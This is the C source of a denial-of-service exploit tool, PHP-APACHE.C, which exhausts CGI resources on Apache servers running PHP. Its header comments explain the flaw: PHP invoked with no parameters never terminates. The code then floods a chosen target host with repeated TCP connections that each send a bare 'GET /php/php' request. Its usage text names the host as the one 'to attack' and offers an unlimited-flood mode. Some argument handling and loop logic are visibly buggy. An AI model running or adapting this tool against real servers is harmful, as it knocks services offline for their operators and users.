/* PHP-APACHE.C
 * By Matthew Murphy
 * Exhaust CGI Resources via PHP on Apache
 * 
 * Calling PHP with no parameters causes it to
 * never terminate; the process must be killed
 * by the server, the OS, or the admin.
 *
 * PHP on Apache requires you to configure a
 * virtual to load PHP out of.  PHP implements
 * a "cgi.force_redirect" value to require that
 * a certain environment variable be set to
 * allow PHP to run further.
 *
 * However, an empty command-line *still* will
 * cause PHP to hang.  If a remote user does
 * this for a lengthy amount of time, the server
 * may no longer launch PHP or other server-side
 * components.
 *
 * NOTE: The vulnerable config is on Apache,
 * but other servers can still be exploited
 * if they offer PHP.EXE (or an SAPI) directly.
 *
 * Usage: php-apache <host> [phpbin] [port] [maxsocks] 
*/

#include <stdio.h>
#include <string.h>

#ifdef _WIN32
#define _WINSOCKAPI_			/* Fix for Winsock.h redef errors 
*/
#include <winsock2.h>			/* WinSock API calls... */
#define WSA_VER		0x0101		/* WinSock ver. to use */
#pragma comment(lib, "wsock32.lib")	/* Check your compiler's docs... 
*/
#else
#include <signal.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#endif

#define DEF_PHP		"/php/php"	/* This is used as the PHP
					 * path if one isn't set
					*/

static char php_buf[] = "GET %s HTTP/1.0\x0d\x0a\x0d\x0a";

void main(int argc, char *argv[]) {
	char host[257];
	char binpath[257];
	int maxsocks;
	char request[300];
	unsigned short port;
	struct hostent *he;
	struct sockaddr_in sa_in;
#ifdef _WIN32
	WSADATA wsa_prov;
	SOCKET s;
#else
	int s;
#endif
	printf("PHP-APACHE.C by Matthew Murphy\x0d\x0a");
	printf("Exhausting CGI resources w/ PHP on 
Apache\x0d\x0a\x0d\x0a");
	maxsocks = 0;
	strcpy(&binpath[0], DEF_PHP);
#ifdef _WIN32
	if (!WSAStartup(WSA_VER, &wsa_prov) == 0) {
		printf("ERROR: Windows Sockets init failed!");
		exit(1);
	}
#endif
	port = (unsigned short)htons(80);
	switch (argc) {
	case 5:
		maxsocks = atoi(argv[4]);
	case 4:
		port = htons((unsigned short)atoi(argv[2]));
	case 3:
		if (strlen(argv[2]) > 256) {
			printf("ERROR: 256 char path limit exceeded in 
'phpbin' argument.");
			exit(1);
		}
		strcpy(&binpath[0], argv[2]);
	case 2:
		if (strlen(argv[1]) > 256) {
			printf("ERROR: No host should be over 256 
chars!");
			exit(1);
		}
		strcpy(&host[0], argv[1]);
		break;
	default:
		printf("Usage: php-apache <host> [port] [maxsocks] 
[phpbin]\x0d\x0a\x0d\x0ahost - The IP/DNS name to attack\x0d\x0aport - The 
port the HTTP service normally runs on (default: 80)\x0d\x0amaxsocks - The 
maximum number of connections to establish (creates a finite flood).  A 
zero value means continue until termination (default: 0)\x0d\x0aphpbin - 
The virtual path to the PHP binary (e.g, /php/php[.exe]; default: 
/php/php)");
		exit(0);
	}
	if (maxsocks == 0) {
		maxsocks--;
	}
	sa_in.sin_family = AF_INET;
	sa_in.sin_port = (unsigned short)port;
	he = gethostbyname(&host[0]);
	if (he == NULL) {
		printf("ERROR: DNS resolution failed, or unknown host.");
		exit(1);
	}
#ifdef _WIN32
	sa_in.sin_addr.S_un.S_addr = (unsigned long)*(unsigned long 
*)he->h_addr;
#else
	sa_in.sin_addr.S_addr = (unsigned long)*(unsigned long 
*)he->h_addr;
#endif
	sprintf(&request[0], &php_buf[0], &binpath[0]);
	while (!maxsocks == 0) {
		s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (s < 0) {
			printf("Couldn't create socket...\x0d\x0aIf you 
continue to receive this error, terminate the program.");
		} else {
			if (!connect(s, (const struct sockaddr FAR 
*)&sa_in, sizeof(struct sockaddr_in)) == 0) {
				printf("Couldn't connect...\x0d\x0aIf you 
continue to receive this error, terminate the program.");
			} else {
				send(s, (char FAR *)&request[0], 
strlen(&request[0]), 0);

/* If the exploit isn't using up server resources
 * try removing this -- the server may be killing
 * the CGI after a disconnect.
*/

#ifdef _WIN32
				shutdown(s, SD_BOTH);
				closesocket(s);
#else
				close(s);
#endif
			}
		}
		if (!maxsocks == -1) {
			maxsocks--;
		}
	}
	return;
}
